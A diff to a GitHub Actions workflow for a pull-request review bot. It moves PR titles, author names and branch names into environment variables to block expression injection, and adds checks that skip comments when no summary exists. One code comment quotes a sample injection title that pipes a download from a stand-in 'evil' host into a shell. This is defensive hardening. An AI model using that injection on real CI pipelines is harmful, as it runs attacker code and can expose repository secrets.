@@ -22,16 +22,29 @@ jobs:
 
       - name: Resolve merge base
         id: base
+        env:
+          # base_ref is a repo branch name (untrusted input surface) — pass
+          # via env, never bash interpolation
+          BASE_REF: ${{ github.base_ref }}
         run: |
-          MB=$(git merge-base "origin/${{ github.base_ref }}" HEAD 2>/dev/null || echo HEAD~1)
+          MB=$(git merge-base "origin/${BASE_REF}" HEAD 2>/dev/null || echo HEAD~1)
           echo "revspec=${MB}..HEAD" >> "$GITHUB_OUTPUT"
 
       - name: Assemble summary comment (markdown)
+        env:
+          # PR-controlled values MUST go through env vars — interpolating
+          # them into the run block allows GHA expression injection
+          # (a PR title like x"; curl evil|sh; " breaks out of the quotes).
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          ACTOR: ${{ github.actor }}
         run: |
-          python3 scripts/pr_bot.py "${{ steps.base.outputs.revspec }}" \
-            "${{ github.event.pull_request.title }}" > /tmp/comment.md
+          python3 scripts/pr_bot.py "${{ steps.base.outputs.revspec }}" > /tmp/comment.md
 
       - name: Collect line-pinned findings (json)
+        env:
+          PR_AUTHOR: ${{ github.event.pull_request.user.login }}
+          ACTOR: ${{ github.actor }}
         run: |
           python3 scripts/pr_bot.py "${{ steps.base.outputs.revspec }}" \
             --format json > /tmp/findings.json
@@ -92,6 +105,11 @@ jobs:
             const fs = require('fs');
             const MARKER = '<!-- codeloom-pr-bot:v2 -->';
             let body = fs.readFileSync('/tmp/comment.md', 'utf8');
+            if (!body || !body.trim()) {
+              // self-review skip: pr_bot.py exits without writing a summary
+              console.log('no summary produced — leaving PR untouched');
+              return;
+            }
             const cap = 60000;
             if (body.length > cap) body = body.slice(0, cap) + '\n… (truncated)';
             const { data: comments } = await github.rest.issues.listComments({
@@ -151,6 +169,10 @@ jobs:
             const body = fs.readFileSync('/tmp/findings.json', 'utf8');
             const n = (() => { try { return JSON.parse(body).length; } catch { return 0; } })();
             const summary = fs.readFileSync('/tmp/comment.md', 'utf8');
+            if (!summary || !summary.trim()) {
+              console.log('no summary produced — skipping codex handoff');
+              return;
+            }
             const m = summary.match(/score \d+\/100 \[(\w+)\]/);
             const band = m ? m[1] : 'unknown';
             // Ask Codex for its pass AFTER ours; our inline findings are
